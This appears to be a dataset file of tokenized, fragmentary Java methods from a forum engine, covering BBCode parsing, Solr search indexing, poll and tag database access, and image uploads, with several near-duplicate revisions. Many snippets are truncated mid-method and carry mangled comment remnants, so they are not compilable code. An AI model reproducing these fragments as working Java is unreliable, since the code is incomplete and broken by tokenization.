private static String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Group . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( groupDao . getGroup ( Integer . parseInt ( text ) ) ) ; 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddMessageRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return AddMessageRequest . class . equals ( clazz ) ; } 
public void copyScreenshotFromPreview ( Template tmpl , int msgid ) throws IOException , UtilException { initFiles ( Integer . toString ( msgid ) , tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " ) ; doResize ( ) ; } 
private void doResize ( ) throws IOException , UtilException { file . renameTo ( mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public void copyScreenshot ( Template tmpl , String sessionId ) throws IOException , UtilException { initFiles ( sessionId , tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " ) ; doResize ( ) ; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = text ; str = escapeHtmlBBcode(text); } else { str = htmlSpecialChars(text); } StringTokenizer st = new StringTokenizer(str, " ", true); StringBuilder sb = new StringBuilder(); while (st.hasMoreTokens()) { sb.append(formatHTMLLine(st.nextToken())); } String res = sb.toString(); if (newLine) { res = nl2br(res, quoting, outputLorcode); } if (texNewLine) { res = texnl2br(res, quoting, outputLorcode); } return res; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = text . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; str = escapeHtmlBBcode(text); } else { str = htmlSpecialChars(text); } StringTokenizer st = new StringTokenizer(str, " ", true); StringBuilder sb = new StringBuilder(); while (st.hasMoreTokens()) { sb.append(formatHTMLLine(st.nextToken())); } String res = sb.toString(); if (newLine) { res = nl2br(res, quoting, outputLorcode); } if (texNewLine) { res = texnl2br(res, quoting, outputLorcode); } return res; } 
public static EditInfoDTO createFromMessage ( Connection db , Message message ) throws SQLException { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . toString ( TagDao . getMessageTags ( db , message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
private boolean equalStrings ( String s1 , String s2 ) { if ( Strings . isNullOrEmpty ( s1 ) ) { return Strings . isNullOrEmpty ( s2 ) ; } return s1 . equals ( s2 ) ; } 
private static boolean equalStrings ( String s1 , String s2 ) { if ( Strings . isNullOrEmpty ( s1 ) ) { return Strings . isNullOrEmpty ( s2 ) ; } return s1 . equals ( s2 ) ; } 
public static String checkAndFixURL ( String url ) throws BadURLException { url = url . trim ( ) ; if ( isUrl ( url ) ) { if ( url . toLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . toLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } throw new BadURLException ( url ) ; } 
public static String fixURL ( String url ) { url = url . trim ( ) ; if ( isUrl ( url ) ) { if ( url . toLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . toLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } return url ; } 
private static int getCurrentPollId ( Connection db ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=votenames.topic AND topics.moderate = 't' AND topics.deleted = 'f' AND topics.commitdate = (select max(commitdate) from topics where groupid=19387 AND moderate AND NOT deleted) " ) ; return rs . next ( ) ? rs . getInt ( " id " ) : 0 ; } 
public Poll get ( ) throws Exception { return pollDao . getCurrentPoll ( ) ; } 
private int allocateMsgid ( ) { return jdbcTemplate . queryForInt ( " select nextval('s_msgid') as msgid " ) ; } 
public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , request . getHeader ( " User-Agent " ) ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public String doInConnection ( Connection db ) throws SQLException , DataAccessException { TagDao . updateTags ( db , msgid , tags ) ; TagDao . updateCounters ( db , Collections . < String > emptyList ( ) , tags ) ; return null ; } 
public void createPoll ( final List < String > pollList , boolean multiSelect , int msgid ) { final int voteid = getNextPollId ( ) ; jdbcTemplate . update ( " INSERT INTO votenames (id, multiselect, topic) values (?,?,?) " , voteid , multiSelect , msgid ) ; try { final Poll poll = getPoll ( voteid ) ; 
public String doInConnection ( Connection db ) throws SQLException , DataAccessException { for ( String variant : pollList ) { if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } return null ; } 
public void prepareMessageTest ( ) { ImmutableList < String > tags = ImmutableList . of ( " one " , " two " ) ; Message message = mock ( Message . class ) ; PollDao pollDao = mock ( PollDao . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDao . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; MessageDao messageDao = mock ( MessageDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . thenReturn ( 13 ) ; group id 13 
private String processUploadImage ( HttpServletRequest request , Template tmpl ) throws IOException , ScriptErrorException { if ( request instanceof MultipartHttpServletRequest ) { MultipartFile multipartFile = ( ( MultipartRequest ) request ) . getFile ( " image " ) ; if ( multipartFile ! = null & & ! multipartFile . isEmpty ( ) ) { File uploadedFile = File . createTempFile ( " preview " , " " , new File ( tmpl . getObjectConfig ( ) . getPathPrefix ( ) + " /linux-storage/tmp/ " ) ) ; String image = uploadedFile . getPath ( ) ; if ( ( uploadedFile . canWrite ( ) | | uploadedFile . createNewFile ( ) ) ) { try { logger . debug ( " Transfering upload to: " + image ) ; multipartFile . transferTo ( uploadedFile ) ; return image ; } catch ( Exception e ) { throw new ScriptErrorException ( " Failed to write uploaded file " , e ) ; } } else { logger . info ( " Bad target file name: " + image ) ; } } } return null ; } 
public Message get ( ) throws SQLException , MessageNotFoundException { return messageDao . getById ( poll . getTopicId ( ) ) ; } 
public Screenshot moveTo ( String dir , String name ) throws IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; FileUtils . moveFile ( mainFile , dest . mainFile ) ; FileUtils . moveFile ( iconFile , dest . iconFile ) ; FileUtils . moveFile ( mediumFile , dest . mediumFile ) ; return dest ; } 
private void doResize ( File uploadedFile ) throws IOException , UtilException { FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
private static short shortBigEndian ( byte firstRead , byte lastRead ) { return ( short ) ( ( ( firstRead & 0xFF ) < < 8 ) | lastRead & 0xFF ) ; } 
private static short shortLittleEndian ( byte firstRead , byte lastRead ) { return shortBigEndian ( lastRead , firstRead ) ; } 
private static int intBigEndian ( byte a1 , byte a2 , byte a3 , byte a4 ) { return ( ( a1 & 0xFF ) < < 24 ) | ( ( a2 & 0xFF ) < < 16 ) | ( ( a3 & 0xFF ) < < 8 ) | a4 & 0xFF ; } 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) throws SQLException { return new DeleteInfo ( resultSet . getString ( " nick " ) , 
public RootNode parse ( String bbcode ) { RootNode rootNode = new RootNode ( parserParameters ) ; rootNode . setRenderOptions ( true , true , " " ) ; return parse ( rootNode , bbcode ) ; } 
public RootNode parse ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = new RootNode ( parserParameters ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; return parse ( rootNode , bbcode ) ; } 
public Set < String > getAllowedListParameters ( ) ; public Set < String > getBlockLevelTags ( ) ; public Map < String , Tag > getAllTagsDict ( ) ; public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getBlockLevelTags ( ) ; public Map < String , Tag > getAllTagsDict ( ) ; public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Map < String , Tag > getAllTagsDict ( ) ; public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getAllTagsNames ( ) ; public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getAutoLinkTags ( ) ; public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public Set < String > getDisallowedParagraphTags ( ) ; public Set < String > getParagraphedTags ( ) ; } 
public static String bb2xhtml ( String bbcode ) { return defaultParser . parse ( bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { UserDao singleUserDao = new UserDao ( ) ; singleUserDao . setJdbcTemplate ( new SingleConnectionDataSource ( db , true ) ) ; return bb2xhtml ( bbcode , renderCut , cleanCut , cutUrl , singleUserDao ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { return defaultParser . parse ( bbcode , renderCut , cleanCut , cutUrl , userDao ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl ) { return defaultParser . parse ( bbcode , renderCut , cleanCut , cutUrl , null ) . renderXHtml ( ) ; } 
public static ParserResult bb2xhtm ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = defaultParser . parse ( bbcode , renderCut , cleanCut , cutUrl , userDao ) ; String html = rootNode . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
public boolean allows ( String tagname ) { return parserParameters . getBlockLevelTags ( ) . contains ( tagname ) ; } 
public String parser ( String lorcode ) { return defaultParser . parse ( lorcode ) . renderXHtml ( ) ; } 
public String parser ( String lorcode , boolean renderCut , boolean cleanCut , String cutUrl ) { return defaultParser . parse ( lorcode , renderCut , cleanCut , cutUrl , userDao ) . renderXHtml ( ) ; } 
public ParserResult parserWithReplies ( String lorcode ) { RootNode rootNode = defaultParser . parse ( lorcode ) ; String html = rootNode . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
public ParserResult parserWithReplies ( String lorcode , boolean renderCut , boolean cleanCut , String cutUrl ) { RootNode rootNode = defaultParser . parse ( lorcode , renderCut , cleanCut , cutUrl , userDao ) ; String html = rootNode . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; doc . addField ( " message " , StringEscapeUtils . unescapeHtml ( topic . getMessage ( ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . addField ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , StringEscapeUtils . unescapeHtml ( message ) ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
private void updateMessage ( Message topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . addField ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } tmpl . getCurrentUser ( ) . checkDelete ( ) ; Calendar current = Calendar . getInstance ( ) ; for ( int i = 0 ; i < 3 ; i + + ) { searchQueueSender . updateMonth ( current . get ( Calendar . YEAR ) , current . get ( Calendar . MONTH ) + 1 ) ; current . add ( Calendar . MONTH , - 1 ) ; } return new ModelAndView ( " action-done " , " message " , " Scheduled reindex last 3 month " ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) throws SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; solrServer . commit ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(commentDao, msg, true); 
public void handleMessage ( SearchQueueSender . UpdateMonth msgUpdate ) throws SQLException , MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = messageDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } solrServer . commit ( ) ; long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
public Integer mapRow ( ResultSet resultSet , int i ) throws SQLException { return resultSet . getInt ( " id " ) ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { jdbcTemplate . update ( insertDelinfo , msgid , user . getId ( ) , reason + " ( " + scoreBonus + ')' ) ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getById ( Integer . parseInt ( text ) ) ) ; 
private void doResize ( File uploadedFile ) throws IOException , UtilException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public ModelAndView topics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) throws Exception { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . toString ( ) ) ) ; 
public ModelAndView topicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) throws Exception { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject . toString ( ) + " &lastmod=true " ) ) ; 
public Group getGroup ( Section section , String name ) throws BadGroupException { try { int id = jdbcTemplate . queryForInt ( " SELECT id FROM groups WHERE section=? AND urlname=? " , section . getId ( ) , name ) ; 
public int calcTopicsCount ( Group group , boolean showDeleted ) throws SQLException { String query = " SELECT count(topics.id) " + " FROM topics WHERE " + ( group . isModerated ( ) ? " moderate AND " : " " ) + " groupid=? " ; if ( ! showDeleted ) { query + = " AND NOT topics.deleted " ; } List < Integer > res = jdbcTemplate . queryForList ( query , Integer . class , group . getId ( ) ) ; if ( ! res . isEmpty ( ) ) { return res . get ( 0 ) ; 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . add ( resultSet . getInt ( " ignored " ) ) ; } 
public void updateCurrentUser ( Connection db ) { initCurrentUser ( db , true ) ; } 
private void initCurrentUser ( Connection db , boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } try { currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Message msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(commentDao, msg, true); 
public String oldTags ( ) { return " redirect:/tags " ; } 
public Message get ( ) throws MessageNotFoundException { return messageDao . getById ( poll . getTopicId ( ) ) ; } 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public ModelAndView showForm ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " msgid " , msgid ) ; Poll poll = pollDao . getPollByTopicId ( msgid ) ; params . put ( " poll " , poll ) ; Message msg = messageDao . getById ( msgid ) ; params . put ( " msg " , msg ) ; List < PollVariant > variants = pollDao . getPollVariants ( poll , Poll . ORDER_ID ) ; params . put ( " variants " , variants ) ; return new ModelAndView ( " edit-vote " , params ) ; } 
public ModelAndView editVote ( HttpServletRequest request , @RequestParam int msgid , @RequestParam int id , @RequestParam String title , @RequestParam ( defaultValue = " false " ) boolean multiSelect ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; Poll poll = pollDao . getPollByTopicId ( msgid ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private ModelAndView prepareModel ( PreparedMessage preparedMessage ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = preparedMessage . getGroup ( ) ; params . put ( " group " , group ) ; params . put ( " groups " , groupDao . getGroups ( preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = messageDao . getEditInfo ( message . getId ( ) ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " topTags " , tagDao . getTopTags ( ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public void processRow ( ResultSet rs ) throws SQLException { set . add ( rs . getString ( " value " ) ) ; } 
private ModelAndView prepareModel ( PreparedMessage preparedMessage , EditMessageRequest form ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = preparedMessage . getGroup ( ) ; params . put ( " group " , group ) ; params . put ( " groups " , groupDao . getGroups ( preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = messageDao . getEditInfo ( message . getId ( ) ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " topTags " , tagDao . getTopTags ( ) ) ; } if ( message . isHaveLink ( ) ) { form . setLinktext ( message . getLinktext ( ) ) ; form . setUrl ( message . getUrl ( ) ) ; } form . setTitle ( message . getTitle ( ) ) ; form . setMsg ( message . getMessage ( ) ) ; return new ModelAndView ( " edit " , params ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditMessageRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > clazz ) { return EditMessageRequest . class . equals ( clazz ) ; } 
public ImmutableList < String > doInConnection ( Connection con ) throws SQLException , DataAccessException { return getMessageTags ( con , msgid ) ; } 
public void updateCounters ( final List < String > oldTags , final List < String > newTags ) { jdbcTemplate . execute ( new ConnectionCallback < String > ( ) { @Override 
public String doInConnection ( Connection con ) throws SQLException , DataAccessException { PreparedStatement stInc = con . prepareStatement ( " UPDATE tags_values SET counter=counter+1 WHERE id=? " ) ; PreparedStatement stDec = con . prepareStatement ( " UPDATE tags_values SET counter=counter-1 WHERE id=? " ) ; for ( String tag : newTags ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; stInc . setInt ( 1 , id ) ; stInc . executeUpdate ( ) ; } } for ( String tag : oldTags ) { if ( ! newTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; stDec . setInt ( 1 , id ) ; stDec . executeUpdate ( ) ; } } return null ; } 
public boolean updateTags ( final int msgid , final List < String > tagList ) { return jdbcTemplate . execute ( new ConnectionCallback < Boolean > ( ) { @Override 
public Boolean doInConnection ( Connection con ) throws SQLException , DataAccessException { List < String > oldTags = getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String tag : tagList ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = true ; } } for ( String tag : oldTags ) { if ( ! tagList . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = true ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
private static boolean isGoodTag ( String tag ) { return tagRE . matcher ( tag ) . matches ( ) ; } 
public boolean isIgnored ( Set < Integer > ignoreList ) { return ignoreList ! = null & & ! ignoreList . isEmpty ( ) & & ignoreList . contains ( userid ) ; } 
public static Set < Integer > makeHideSet ( UserDao userDao , CommentList comments , int filterChain , Set < Integer > ignoreList ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) throws Exception { Message message = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( message . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! message . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( message . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . toString ( ) ) ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) throws MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; solrServer . commit ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Message msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentDao.getCommentList(msg, true); 
